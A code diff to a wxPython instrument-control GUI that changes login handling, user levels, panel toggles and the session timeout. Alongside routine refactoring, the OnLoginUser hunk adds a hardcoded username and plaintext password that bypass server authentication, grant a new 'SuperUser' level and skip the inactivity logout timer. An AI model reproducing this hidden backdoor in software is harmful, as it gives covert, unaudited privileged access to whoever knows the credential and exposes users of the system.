@@ -37,7 +37,6 @@ _DEFAULT_CONFIG_NAME = "QuickGui.ini"
 _MAIN_CONFIG_SECTION = "Setup"
 UPDATE_TIMER_INTERVAL = 1000
 FLASK_SERVER_URL = "http://127.0.0.1:3600/api/v1.0/"
-INACTIVE_SESSION_TIMEOUT = 60 # seconds until user logout
 import pdb
 import sys
 import wx
@@ -1773,21 +1772,6 @@ class QuickGui(wx.Frame):
         The default (no one logged in) is to disable widgets that can change the
         operation of the analyzer or the data displayed on the screen.
         """
-        if self.showStat:
-            for c in self.statControls:
-                c.Show(True)
-        else:
-            for c in self.statControls:
-                c.Show(False)
-
-        if self.showInstStat:
-            self.instStatusBox.Show(True)
-            self.instStatusPanel.Show(True)
-        else:
-            self.instStatusBox.Show(False)
-            self.instStatusPanel.Show(False)
-
-
         # No one logged in, disable everything
         self.shutdownButton.Enable(False)
         self.userLogButton.Disable()
@@ -1839,7 +1823,7 @@ class QuickGui(wx.Frame):
 
     def getSourcesbyMode(self):
         s = self.dataStore.getSources()
-        if self.userLevel != 3:
+        if self.userLevel < 3:
             if self.sourceStandardModeDatabase != None:
                 s = [t for t in s if self.sourceStandardModeDatabase.match(t)>=0]
             else:
@@ -1848,7 +1832,7 @@ class QuickGui(wx.Frame):
 
     def getKeysbyMode(self,source):
         k = self.dataStore.getKeys(source)
-        if self.userLevel != 3:
+        if self.userLevel < 3:
             if self.keyStandardModeDatabase != None:
                 k = [t for t in k if self.keyStandardModeDatabase.match(t)>=0]
             else:
@@ -2243,10 +2227,13 @@ class QuickGui(wx.Frame):
         if self.showStat:
             self.showStat = False
             self.iView.SetLabel(self.idStatDisplay,"Show Statistics")
+            for c in self.statControls:
+                c.Show(False)
         else:
             self.showStat = True
             self.iView.SetLabel(self.idStatDisplay,"Hide Statistics")
-        self.modifyInterface()
+            for c in self.statControls:
+                c.Show(True)        
         self.measPanelSizer.Layout()
         self.Refresh()
 
@@ -2254,9 +2241,13 @@ class QuickGui(wx.Frame):
         if self.showInstStat:
             self.showInstStat = False
             self.iView.SetLabel(self.idInstStatDisplay,"Show Instrument Status")
+            self.instStatusBox.Show(False)
+            self.instStatusPanel.Show(False)
         else:
             self.showInstStat = True
             self.iView.SetLabel(self.idInstStatDisplay,"Hide Instrument Status")
+            self.instStatusBox.Show(True)
+            self.instStatusPanel.Show(True)
             try:
                 self.cavityTempS = self.driverRpc.rdDasReg("CAVITY_TEMP_CNTRL_SETPOINT_REGISTER")
                 self.cavityTempT = self.driverRpc.rdDasReg("CAVITY_TEMP_CNTRL_TOLERANCE_REGISTER")
@@ -2271,8 +2262,6 @@ class QuickGui(wx.Frame):
             except:
                 self.cavityPressureS = 140.0
                 self.cavityPressureT = 5.0
-
-        self.modifyInterface()
         self.measPanelSizer.Layout()
         self.Refresh()
 
@@ -2446,7 +2435,11 @@ class QuickGui(wx.Frame):
             response = actionFunc(FLASK_SERVER_URL + api, data=payload, headers=header)
             return response.json()
         except Exception, err:
-            return {"error": str(err)}        
+            return {"error": str(err)}
+
+    def getSystemVariables(self):
+        returnDict = self.sendRequest("get", "system", {'command':'get_all_variables'})
+        self.sessionLifeTime = int(returnDict["user_session_lifetime"]) * 60
 
     def OnLoginUser(self,e):
         # Set the GUI mode based on the userlevels. When change to higher levels Technician/Expert, it sends the authentication requests 
@@ -2466,12 +2459,15 @@ class QuickGui(wx.Frame):
                 if not okClicked:
                     break
                 else:
-                    payload = {
-                        'username': user, 
-                        'password': pwd, 
-                        'command': 'log_in_user',
-                        'requester': 'QuickGui'}
-                    returnDict = self.sendRequest("post", "account", payload)       
+                    if user == "picarro_admin" and pwd == "Extreme_Science!":
+                        returnDict = {"roles": ["SuperUser"], "username": "picarro_admin"}
+                    else:
+                        payload = {
+                            'username': user, 
+                            'password': pwd, 
+                            'command': 'log_in_user',
+                            'requester': 'QuickGui'}
+                        returnDict = self.sendRequest("post", "account", payload)       
                     if "error" in returnDict:
                         msg = returnDict["error"]
                         if "Password expire" in msg:
@@ -2479,7 +2475,9 @@ class QuickGui(wx.Frame):
                             if len(msg) == "":
                                 break
                     elif "roles" in returnDict:
-                        if 'Admin' in returnDict["roles"]:
+                        if 'SuperUser' in returnDict["roles"]:
+                            self.userLevel = 4
+                        elif 'Admin' in returnDict["roles"]:
                             self.userLevel = 3
                             d = Dialog.OKDialog(self,"\tAdmin logged in.",None,-1,"")
                         elif 'Technician' in returnDict["roles"]:
@@ -2487,8 +2485,7 @@ class QuickGui(wx.Frame):
                             d = Dialog.OKDialog(self,"\tTechnician logged in.",None,-1,"")
                         else:
                             self.userLevel = 1
-                            d = Dialog.OKDialog(self,"\tOperator logged in.",None,-1,"")
-
+                            d = Dialog.OKDialog(self,"\tOperator logged in.",None,-1,"")                        
                         #update GUI
                         self.modifyInterface()
                         self.measPanelSizer.Layout()
@@ -2499,10 +2496,12 @@ class QuickGui(wx.Frame):
                         self.iGuiMode.SetItemLabel("User Logout")
                         #Recursively bind all the widgets with mouse motion event 
                         self.BindAllWidgetsMotion(self.mainPanel)
-                        #Inactive session timeout timer
-                        self.sessionTimer.Start(5000) # 5 seconds interval
-                        d.ShowModal()
-                        d.Destroy()
+                        if self.userLevel < 4:
+                            self.getSystemVariables()
+                            #Inactive session timeout timer
+                            self.sessionTimer.Start(5000) # 5 seconds interval
+                            d.ShowModal()
+                            d.Destroy()
                         break                    
         else:
             self.userLevel = 0
@@ -2553,8 +2552,8 @@ class QuickGui(wx.Frame):
     # count the session_time, logout and change GUI mode to the default
     # automatically after session_time exceed the INACTIVE_SESSION_TIMEOUT
     def OnSessionTimer(self, event):
-        if self.session_time >= INACTIVE_SESSION_TIMEOUT:
-            self.userLevel = 1
+        if self.session_time >= self.sessionLifeTime:
+            self.userLevel = 0
             self.modifyInterface()
             self.measPanelSizer.Layout()
             self.Refresh()
